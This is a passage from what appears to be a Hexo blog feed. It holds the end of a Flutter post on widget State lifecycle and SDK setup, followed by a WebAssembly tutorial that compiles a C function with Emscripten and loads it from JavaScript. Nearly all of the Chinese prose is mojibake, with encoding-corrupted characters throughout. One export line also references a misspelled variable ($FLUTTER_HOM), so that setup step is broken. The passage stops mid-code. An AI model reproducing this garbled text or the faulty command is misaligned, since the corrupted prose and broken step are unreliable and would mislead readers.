”¨çš„ç»å¤§éƒ¨åˆ†widgetéƒ½æ˜¯ç»§æ‰¿è‡ªWidgetç±»ï¼Œ</p><h3 id="ç”Ÿå‘½å‘¨æœŸ"><a href="#ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ç”Ÿå‘½å‘¨æœŸ"></a>ç”Ÿå‘½å‘¨æœŸ</h3><p>** æ§ä»¶ç”Ÿå‘½å‘¨æœŸ **</p><img src="/posts/2a2a7e8a/flutterWidgetBuild.png" class="" title="Flutterè¿è¡Œ"><p>** çŠ¶æ€ç”Ÿå‘½å‘¨æœŸ **</p><img src="/posts/2a2a7e8a/FlutterState.png" class="" title="Flutterè¿è¡Œ"><p>** ç”Ÿå‘½å‘¨æœŸæœ‰å››ç§çŠ¶æ€ï¼š **</p><p>createdï¼šå½“Stateå¯¹è±¡è¢«åˆ›å»ºæ—¶å€™ï¼ŒState.initStateæ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼›</p><p>initializedï¼šå½“Stateå¯¹è±¡è¢«åˆ›å»ºï¼Œä½†è¿˜æ²¡æœ‰å‡†å¤‡æ„å»ºæ—¶ï¼ŒState.didChangeDependenciesåœ¨è¿™ä¸ªæ—¶å€™ä¼šè¢«è°ƒç”¨ï¼›</p><p>readyï¼šStateå¯¹è±¡å·²ç»å‡†å¤‡å¥½äº†æ„å»ºï¼ŒState.disposeæ²¡æœ‰è¢«è°ƒç”¨çš„æ—¶å€™ï¼›</p><p>defunctï¼šState.disposeè¢«è°ƒç”¨åï¼ŒStateå¯¹è±¡ä¸èƒ½å¤Ÿè¢«æ„å»ºã€‚</p><p>** å®Œæ•´ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š **</p><ol><li><p>åˆ›å»ºä¸€ä¸ªStateå¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨StatefulWidget.createStateï¼›</p></li><li><p>å’Œä¸€ä¸ªBuildContextç›¸å…³è”ï¼Œå¯ä»¥è®¤ä¸ºè¢«åŠ è½½äº†ï¼ˆmountedï¼‰ï¼›</p></li><li><p>è°ƒç”¨initStateï¼›</p></li><li><p>è°ƒç”¨didChangeDependenciesï¼›</p></li><li><p>ç»è¿‡ä¸Šè¿°æ­¥éª¤ï¼ŒStateå¯¹è±¡è¢«å®Œå…¨çš„åˆå§‹åŒ–äº†ï¼Œè°ƒç”¨buildï¼›</p></li><li><p>å¦‚æœæœ‰éœ€è¦ï¼Œä¼šè°ƒç”¨didUpdateWidgetï¼›</p></li><li><p>å¦‚æœå¤„åœ¨å¼€å‘æ¨¡å¼ï¼Œçƒ­åŠ è½½ä¼šè°ƒç”¨reassembleï¼›</p></li><li><p>å¦‚æœå®ƒçš„å­æ ‘ï¼ˆsubtreeï¼‰åŒ…å«éœ€è¦è¢«ç§»é™¤çš„Stateå¯¹è±¡ï¼Œä¼šè°ƒç”¨deactivateï¼›</p></li><li><p>è°ƒç”¨dispose,Stateå¯¹è±¡ä»¥åéƒ½ä¸ä¼šè¢«æ„å»ºï¼›</p></li><li><p>å½“è°ƒç”¨äº†dispose,Stateå¯¹è±¡å¤„äºæœªåŠ è½½ï¼ˆunmountedï¼‰ï¼Œå·²ç»è¢«disposeçš„Stateå¯¹è±¡æ²¡æœ‰åŠæ³•è¢«é‡æ–°åŠ è½½ï¼ˆremountï¼‰ã€‚</p></li></ol><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ol><li>å…‹éš†Flutter ä»“åº“åˆ°æœ¬åœ°</li></ol><blockquote><p>git clone -b master <a href="https://github.com/flutter/flutter.git">https://github.com/flutter/flutter.git</a></p></blockquote><ol start="2"><li>é…ç½®ç¯å¢ƒå˜é‡</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PUB_HOSTED_URL=https://pub.flutter-io.cn //å›½å†…ç”¨æˆ·éœ€è¦è®¾ç½®</span><br><span class="line"><span class="built_in">export</span> FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn //å›½å†…ç”¨æˆ·éœ€è¦è®¾ç½®</span><br><span class="line"><span class="built_in">export</span> FLUTTER_HOME= // è®¾ç½®Flutter SDK ç›®å½•</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$FLUTTER_HOM</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><ol start="3"><li>æ‰§è¡Œå‘½ä»¤æ£€æµ‹Flutterä¾èµ–ï¼Œ éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼ˆè¿™æ ·ä¼šè‡ªåŠ¨ä¸‹è½½ï¼‰</li></ol><blockquote><p>flutter doctor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> true </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webAssembly</title>
      <link href="posts/7f98c2be/"/>
      <url>posts/7f98c2be/</url>
      
        <content type="html"><![CDATA[<h2 id="What-WebAssembly"><a href="#What-WebAssembly" class="headerlink" title="What WebAssembly ?"></a>What WebAssembly ?</h2><ul><li><p>WebAssemblyç®€ç§°WASMï¼Œæ˜¯ä¸€ç§ä»¥å®‰å…¨æœ‰æ•ˆçš„æ–¹å¼è¿è¡Œä¾¿æºå¼ç¨‹åºçš„æ–°æŠ€æœ¯ï¼Œä¸»è¦é’ˆå¯¹Webå¹³å°ã€‚ä¸ASM.jsç±»ä¼¼ï¼ŒWASMçš„ç›®æ ‡æ˜¯ä½çº§åˆ«çš„æŠ½è±¡ï¼Œé€‚åˆä½œä¸ºæ›´é«˜çº§åˆ«ç¨‹åºçš„ä¸­é—´è¡¨ç¤º - å³WebAssemblyä»£ç æ—¨åœ¨ç”±ç¼–è¯‘å™¨ç”Ÿæˆè€Œä¸æ˜¯ç”±äººç±»ç¼–å†™ã€‚åœ¨W3Cç¤¾åŒºç»„åŒ…æ‹¬æ¥è‡ªæœ€å¤§çš„ç½‘ç»œæµè§ˆå™¨çš„å…¬å¸ï¼ŒåŒ…æ‹¬è°·æ­Œï¼Œå¾®è½¯ï¼Œè‹¹æœå’ŒMozillaåšè¿™ä»¶äº‹ï¼Œè€Œä»¤äººå…´å¥‹çš„ä»£è¡¨ã€‚</p></li><li><p>WebAssemblyæ˜¯ä¸€ç§æ–°çš„é€‚åˆäºç¼–è¯‘åˆ°Webçš„ï¼Œå¯ç§»æ¤çš„ï¼Œå¤§å°å’ŒåŠ è½½æ—¶é—´é«˜æ•ˆçš„æ ¼å¼ï¼Œæ˜¯ä¸€ç§æ–°çš„å­—èŠ‚ç æ ¼å¼ã€‚å®ƒçš„ç¼©å†™æ˜¯â€.wasmâ€ï¼Œ.wasm ä¸ºæ–‡ä»¶ååç¼€ï¼Œæ˜¯ä¸€ç§æ–°çš„åº•å±‚å®‰å…¨çš„â€œäºŒè¿›åˆ¶â€è¯­æ³•ã€‚å®ƒè¢«å®šä¹‰ä¸ºâ€œç²¾ç®€ã€åŠ è½½æ—¶é—´çŸ­çš„æ ¼å¼å’Œæ‰§è¡Œæ¨¡å‹â€ï¼Œå¹¶ä¸”è¢«è®¾è®¡ä¸ºWeb å¤šç¼–ç¨‹è¯­è¨€ç›®æ ‡æ–‡ä»¶æ ¼å¼ã€‚<br>è¿™æ„å‘³ç€æµè§ˆå™¨ç«¯çš„æ€§èƒ½ä¼šå¾—åˆ°æå¤§æå‡ï¼Œå®ƒä¹Ÿä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿå®ç°ä¸€ä¸ªåº•å±‚æ„å»ºæ¨¡å—çš„é›†åˆ.</p></li></ul><a id="more"></a><h2 id="webAssemblyçš„ä¼˜åŠ¿"><a href="#webAssemblyçš„ä¼˜åŠ¿" class="headerlink" title="webAssemblyçš„ä¼˜åŠ¿"></a>webAssemblyçš„ä¼˜åŠ¿</h2><p>webassemblyç›¸è¾ƒäºasm.jsçš„ä¼˜åŠ¿ä¸»è¦æ˜¯æ¶‰åŠåˆ°æ€§èƒ½æ–¹é¢ã€‚æ ¹æ®WebAssembly FAQçš„æè¿°ï¼šåœ¨ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œå¯¹äºå¾ˆå¤§çš„ä»£ç åº“ï¼Œasm.jsä»…ä»…è§£æå°±éœ€è¦èŠ±è´¹20-40ç§’ï¼Œè€Œå®éªŒæ˜¾ç¤ºWebAssemblyçš„åŠ è½½é€Ÿåº¦æ¯”asm.jså¿«äº†20å€ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºç›¸æ¯”è§£æ asm.js ä»£ç ï¼ŒJavaScript å¼•æ“ç ´è¯‘äºŒè¿›åˆ¶æ ¼å¼çš„é€Ÿåº¦è¦å¿«å¾—å¤šã€‚</p><p>ä¸»æµçš„æµè§ˆå™¨ç›®å‰å‡æ”¯æŒwebAssemblyã€‚</p><ul><li>Safari æ”¯æŒ WebAssemblyçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯ 11</li><li>Edge æ”¯æŒ WebAssemblyçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯ 16</li><li>Firefox æ”¯æŒ WebAssemblyçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯ 52</li><li>chrome æ”¯æŒ WebAssemblyçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯ 57</li></ul><p>ä½¿ç”¨WebAssemblyï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡Œä¸€äº›é«˜æ€§èƒ½ã€ä½çº§åˆ«çš„ç¼–ç¨‹è¯­è¨€ï¼Œå¯ç”¨å®ƒå°†å¤§å‹çš„Cå’ŒC++ä»£ç åº“æ¯”å¦‚æ¸¸æˆã€ç‰©ç†å¼•æ“ç”šè‡³æ˜¯æ¡Œé¢åº”ç”¨ç¨‹åºå¯¼å…¥Webå¹³å°ã€‚</p><h2 id="å¼€å‘å‰å‡†å¤‡å·¥ä½œ"><a href="#å¼€å‘å‰å‡†å¤‡å·¥ä½œ" class="headerlink" title="å¼€å‘å‰å‡†å¤‡å·¥ä½œ"></a>å¼€å‘å‰å‡†å¤‡å·¥ä½œ</h2><h3 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h3><blockquote><p>MACç³»ç»Ÿ</p></blockquote><h3 id="å®‰è£…å·¥å…·"><a href="#å®‰è£…å·¥å…·" class="headerlink" title="å®‰è£…å·¥å…·"></a>å®‰è£…å·¥å…·</h3><blockquote><p>git ã€node ã€python ã€cmakeã€emsdk</p></blockquote><h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><p>å·²ç»é»˜è®¤è£…</p><h4 id="node"><a href="#node" class="headerlink" title="node"></a>node</h4><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>å®˜ç½‘ï¼š<a href="https://www.python.org/">https://www.python.org</a><br>ä¸‹è½½åœ°å€ï¼š<a href="https://www.python.org/ftp/python/3.7.0/python-3.7.0-macosx10.9.pkg">https://www.python.org/ftp/python/3.7.0/python-3.7.0-macosx10.9.pkg</a></p><h4 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h4><p> å®˜ç½‘ï¼š<a href="http://www.cmake.org/">http://www.cmake.org</a><br> ä¸‹è½½åœ°å€ï¼š<a href="https://cmake.org/files/v3.12/cmake-3.12.1-Darwin-x86_64.dmg">https://cmake.org/files/v3.12/cmake-3.12.1-Darwin-x86_64.dmg</a></p><p> ä¸ºäº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨ï¼Œéœ€è¦æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ã€‚<br> sudo â€œ/Applications/CMake.app/Contents/bin/cmake-guiâ€ â€“install</p><h4 id="emsdk"><a href="#emsdk" class="headerlink" title="emsdk"></a>emsdk</h4><p>Emscripten çš„åº•å±‚æ˜¯ LLVM ç¼–è¯‘å™¨ï¼Œç†è®ºä¸Šä»»ä½•å¯ä»¥ç”Ÿæˆ LLVM IRï¼ˆIntermediate Representationï¼‰çš„è¯­è¨€ï¼Œéƒ½å¯ä»¥ç¼–è¯‘ç”Ÿæˆ asm.jsã€‚ ä½†æ˜¯å®é™…ä¸Šï¼ŒEmscripten å‡ ä¹åªç”¨äºå°† C / C++ ä»£ç ç¼–è¯‘ç”Ÿæˆ asm.jsã€‚</p><blockquote><p>** C/C++ ** â‡’ ** LLVM ** ==&gt; ** LLVM IR ** â‡’ ** Emscripten ** â‡’ ** asm.js **</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/juj/emsdk.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> emsdk</span><br><span class="line"></span><br><span class="line">./emsdk update</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ./emsdk_env.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æµè§ˆå™¨æ”¯æŒ"><a href="#æµè§ˆå™¨æ”¯æŒ" class="headerlink" title="æµè§ˆå™¨æ”¯æŒ"></a>æµè§ˆå™¨æ”¯æŒ</h3><blockquote><p>Chrome: æ‰“å¼€ chrome://flags/#enable-webassemblyï¼Œé€‰æ‹© enableã€‚<br>Firefox: æ‰“å¼€ about:config å°† javascript.options.wasm è®¾ç½®ä¸º trueã€‚</p></blockquote><h2 id="å¼€å§‹ç¼–ç¨‹"><a href="#å¼€å§‹ç¼–ç¨‹" class="headerlink" title="å¼€å§‹ç¼–ç¨‹"></a>å¼€å§‹ç¼–ç¨‹</h2><h3 id="ç¼–å†™Cä»£ç "><a href="#ç¼–å†™Cä»£ç " class="headerlink" title="ç¼–å†™Cä»£ç "></a>ç¼–å†™Cä»£ç </h3><p>åˆ›å»º** example.c ** æ–‡ä»¶ï¼Œå¹¶å†™å…¥å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// example.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">float</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å‡ºwasm"><a href="#ç¼–è¯‘å‡ºwasm" class="headerlink" title="ç¼–è¯‘å‡ºwasm"></a>ç¼–è¯‘å‡ºwasm</h3><p>** bash æ‰§è¡Œå‘½ä»¤ï¼š **</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc -s EXPORTED_FUNCTIONS=<span class="string">&quot;[&#x27;_add]&quot;</span> example.c -s WASM=1 -s SIDE_MODULE=1 -s BINARYEN_ASYNC_COMPILATION=0 -o example.wasm </span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨wasm"><a href="#è°ƒç”¨wasm" class="headerlink" title="è°ƒç”¨wasm"></a>è°ƒç”¨wasm</h3><blockquote><p>jsè°ƒç”¨wasmä¸­å¯¼å‡ºçš„module</p></blockquote><p>** loaderæ¨¡å—ç¼–å†™ **</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadWebAssembly</span>(<span class="params">path, imports = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> fetch(path)</span><br><span class="line">    .then(<span class="function"><span class="params">response</span> =&gt;</span> response.arrayBuffer())</span><br><span class="line">    .then(<span class="function"><span class="params">buffer</span> =&gt;</span> WebAssembly.compile(buffer))</span><br><span class="line">    .then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//é’ˆå¯¹wasmæ‰€éœ€çš„importå¤„ç†ï¼ŒimportObject</span></span><br><span class="line">      imports.env = imports.env || &#123;&#125;</span><br><span class="line">      imports.env = imports.env || &#123;&#125;</span><br><span class="line">      imports.env.DYNAMICTOP_PTR = imports.env.DYNAMICTOP_PTR || <span class="number">0</span>;</span><br><span class="line">      imports.env.tempDoublePtr = imports.env.tempDoublePtr || <span class="number">0</span>;</span><br><span class="line">      imports.env.ABORT = imports.env.ABORT || <span class="number">0</span>;</span><br><span class="line">      imports.global = imports.global || &#123; <span class="attr">NaN</span>: <span class="number">1</span>, <span class="attr">Infinity</span>: <span class="number">2</span> &#125;;</span><br><span class="line">      imports.env.abortStackOverflow = imports.env.abortStackOverflow || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">      imports.env.nullFunc_X = imports.env.nullFunc_X || <span class="keyword">new</span> <span class="built_in">Function</span>();</span><br><span class="line">      <span class="comment">// å¼€è¾Ÿå†…å­˜ç©ºé—´</span></span><br><span class="line">      imports.env.memoryBase = imports.env.memoryBase || <span class="number">0</span></span><br><span class="line">      <span class="keyword">if</span> (!imports.env.memory) &#123;</span><br><span class="line">        imports.env.memory = <span class="keyword">new</span> WebAssembly.Memory(&#123; <span class="attr">initial</span>: <span class="number">256</span> &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// åˆ›å»ºå˜é‡æ˜ å°„è¡¨</span></span><br><span class="line">      imports.env.tableBase = imports.env.tableBase || <span class="number">0</span></span><br><span class="line">      <span class="keyword">if</span> (!imports.env.table) &#123;</span><br><span class="line">        imports.env.table = <span class="keyword">new</span> WebAssembly.Table(&#123; <span class="attr">initial</span>: <span class="number">2</span>, <span class="attr">element</span>: <span class="string">&#x27;anyfunc&#x27;</span> &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// åˆ›å»º WebAssembly å®ä¾‹</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> WebAssembly.instantiate(<span class="built_in">module</span>, imports)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="htmlç‰‡æ®µ"><a href="#htmlç‰‡æ®µ" class="headerlink" title="htmlç‰‡æ®µ"></a>htmlç‰‡æ®µ</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>å–éšæœºæ•°<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> wasm = loadWebAssembly(<span class="string">&#x27;example.wasm&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> myButton = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;mybutton&#x27;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> x = <span class="number">1.22</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> y = <span class="number">2.11</span>;</span></span><br><span class="line"><span class="javascript">        myButton.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            wasm.then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;wasm-è®¡ç®—ï¼š&#x27;</span> + <span class="built_in">module</span>.exports._add(x, y));</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;js-è®¡ç®—ï¼š&#x27;</span> + (x + y));</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="WebAssemblyç»„æˆéƒ¨åˆ†"><a href="#WebAssemblyç»„æˆéƒ¨åˆ†" class="headerlink" title="WebAssemblyç»„æˆéƒ¨åˆ†"></a>WebAssemblyç»„æˆéƒ¨åˆ†</h2><blockquote><p>å®é™…ä¸Š** WebAssembly **è¢«ç§°ä¸º â€œæ¨¡å—â€ï¼Œå› ä¸ºä½¿ç”¨WebAssemblyï¼Œâ€ç¨‹åºâ€å’Œâ€åº“â€ä¹‹é—´æ²¡æœ‰åŒºåˆ« - åªæœ‰â€æ¨¡å—â€ï¼Œæ¯ä¸ªæ¨¡å—éƒ½å¯ä»¥ä¸å…¶ä»–æ¨¡å—ç»‘å®šå’Œé€šä¿¡ï¼Œæ¯ä¸ªæ¨¡å—éƒ½å¯ä»¥å…·æœ‰â€æ¨¡å—â€ä¸»åŠŸèƒ½ã€‚</p></blockquote><h3 id="å¿…é€‰éƒ¨åˆ†"><a href="#å¿…é€‰éƒ¨åˆ†" class="headerlink" title="å¿…é€‰éƒ¨åˆ†"></a>å¿…é€‰éƒ¨åˆ†</h3><ul><li>Typeï¼šåœ¨æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°çš„å‡½æ•°å£°æ˜å’Œæ‰€æœ‰å¼•å…¥å‡½æ•°çš„å‡½æ•°å£°æ˜ã€‚</li><li>Functionï¼šç»™å‡ºæ¨¡å—ä¸­æ¯ä¸ªå‡½æ•°ä¸€ä¸ªç´¢å¼•ã€‚</li><li>Codeï¼šæ¨¡å—ä¸­æ¯ä¸ªå‡½æ•°çš„å®é™…å‡½æ•°ä½“ã€‚</li></ul><h3 id="å¯é€‰éƒ¨åˆ†"><a href="#å¯é€‰éƒ¨åˆ†" class="headerlink" title="å¯é€‰éƒ¨åˆ†"></a>å¯é€‰éƒ¨åˆ†</h3><ul><li>Exportï¼šä½¿å‡½æ•°ã€å†…å­˜ã€è¡¨ï¼ˆtablesï¼‰ã€å…¨å±€å˜é‡ç­‰å¯¹å…¶ä»– WebAssembly æˆ– JavaScript å¯è§ï¼Œå…è®¸åŠ¨æ€é“¾æ¥ä¸€äº›åˆ†å¼€ç¼–è¯‘çš„ç»„ä»¶ï¼Œå³ .dll çš„WebAssembly ç‰ˆæœ¬ã€‚</li><li>Importï¼šå…è®¸ä»å…¶ä»– WebAssembly æˆ–è€… JavaScript ä¸­å¯¼å…¥æŒ‡å®šçš„å‡½æ•°ã€å†…å­˜ã€è¡¨æˆ–è€…å…¨å±€å˜é‡ã€‚</li><li>Startï¼šå½“ WebAssembly æ¨¡å—åŠ è½½è¿›æ¥çš„æ—¶å€™ï¼Œå¯ä»¥è‡ªåŠ¨è¿è¡Œçš„å‡½æ•°ï¼ˆç±»ä¼¼äº main å‡½æ•°ï¼‰ã€‚</li><li>Globalï¼šå£°æ˜æ¨¡å—çš„å…¨å±€å˜é‡ã€‚</li><li>Memoryï¼šå®šä¹‰æ¨¡å—ç”¨åˆ°çš„å†…å­˜ã€‚</li><li>Tableï¼šä½¿å¾—å¯ä»¥æ˜ å°„åˆ° WebAssembly æ¨¡å—ä»¥å¤–çš„å€¼ï¼Œå¦‚æ˜ å°„åˆ° JavaScript çš„å¯¹è±¡ã€‚è¿™åœ¨é—´æ¥å‡½æ•°è°ƒç”¨æ—¶å¾ˆæœ‰ç”¨ã€‚</li><li>Dataï¼šåˆå§‹åŒ–å¯¼å…¥çš„æˆ–è€…å±€éƒ¨å†…å­˜ã€‚</li><li>Elementï¼šåˆå§‹åŒ–å¯¼å…¥çš„æˆ–è€…å±€éƒ¨çš„è¡¨ã€‚</li></ul><h2 id="é‡åˆ°çš„å‘"><a href="#é‡åˆ°çš„å‘" class="headerlink" title="é‡åˆ°çš„å‘"></a>é‡åˆ°çš„å‘</h2><h3 id="æ— æ³•å¯¼å…¥ç¯å¢ƒå˜é‡"><a href="#æ— æ³•å¯¼å…¥ç¯å¢ƒå˜é‡" class="headerlink" title="æ— æ³•å¯¼å…¥ç¯å¢ƒå˜é‡"></a>æ— æ³•å¯¼å…¥ç¯å¢ƒå˜é‡</h3><blockquote><p>åœ¨æ‰§è¡Œ source ./emsdk_env.sh å‘½ä»¤æ—¶å¤±è´¥ï¼Œæ— æ³•æ·»åŠ ç¯å¢ƒå˜é‡</p></blockquote><p>æ€è·¯ï¼šè„šæœ¬å®ç°ä¸äº†ï¼Œå°±ä¸è¦ä½¿ç”¨æä¾›çš„è„šæœ¬å‘½ä»¤ï¼Œæ‰‹åŠ¨æ·»åŠ ä¹Ÿå¯ä»¥ã€‚æœ€ç»ˆæ˜¯è¦åœ¨ä»»ä½•çª—å£ä¸­éƒ½èƒ½æ‰§è¡Œå‘½ä»¤ã€‚<br>æ‰‹åŠ¨æ·»åŠ ç¯å¢ƒå˜é‡ï¼Œä¸€èˆ¬éƒ½æ˜¯æ·»åŠ åœ¨å½“å‰ç”¨æˆ·åŒºï¼Œå’Œwindowsç†å¿µä¸€æ ·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PATH=<span class="string">&quot;/Library/Frameworks/Python.framework/Versions/3.7/bin:<span class="variable">$&#123;PATH&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/clang/e1.38.8_64bit:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/node/8.9.1_64bit/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/Users/liuzhipan/emsdk/emscripten/1.38.8:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/Library/Frameworks/Python.framework/Versions/3.7/bin/python3.7&#x27;</span></span><br><span class="line"><span class="built_in">export</span> EMSDK=/Users/liuzhipan/emsdk</span><br><span class="line"><span class="built_in">export</span> EM_CONFIG=/Users/liuzhipan/.emscripten</span><br><span class="line"><span class="built_in">export</span> BINARYEN_ROOT=/Users/liuzhipan/emsdk/clang/e1.38.8_64bit/binaryen</span><br><span class="line"><span class="built_in">export</span> EMSCRIPTEN=/Users/liuzhipan/emsdk/emscripten/1.38.8</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$EMSDK</span>:<span class="variable">$EM_CONFIG</span>:<span class="variable">$BINARYEN_ROOT</span>:<span class="variable">$EMSCRIPTEN</span></span><br></pre></td></tr></table></figure><p>ä»¿ç…§è¿™ä»½ç¯å¢ƒå˜é‡ä¿®æ”¹å¯¹åº”ç›®å½•-è·¯å¾„å³å¯ã€‚</p><blockquote><p>vim ~/.bash_profile         //æ·»åŠ ä¸Šè¿°çš„ç¯å¢ƒå˜é‡<br>source ~/.bash_profile   // åˆ·æ–°å½“å‰ç”¨æˆ·ç¯å¢ƒå˜é‡ç¼“å†²ï¼Œä½¿å…¶ç”Ÿæ•ˆ</p></blockquote><h3 id="å®ä¾‹åŒ–moduleå¤±è´¥"><a href="#å®ä¾‹åŒ–moduleå¤±è´¥" class="headerlink" title="å®ä¾‹åŒ–moduleå¤±è´¥"></a>å®ä¾‹åŒ–moduleå¤±è´¥</h3><blockquote><p>æ„å»ºå‡ºæ¥åŒ…ä¹‹åï¼Œå‘ç°importObjectæä¾›çš„èµ„æºç¼ºå°‘å¯¼è‡´å®ä¾‹åŒ–moduleå¤±è´¥ã€‚</p></blockquote><p>æ€è·¯ï¼šå®˜ç½‘æä¾›çš„å¤§éƒ¨åˆ†éƒ½æ˜¯envå¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼€è¾Ÿå†…å­˜ç©ºé—´</span></span><br><span class="line">imports.env.memoryBase = imports.env.memoryBase || <span 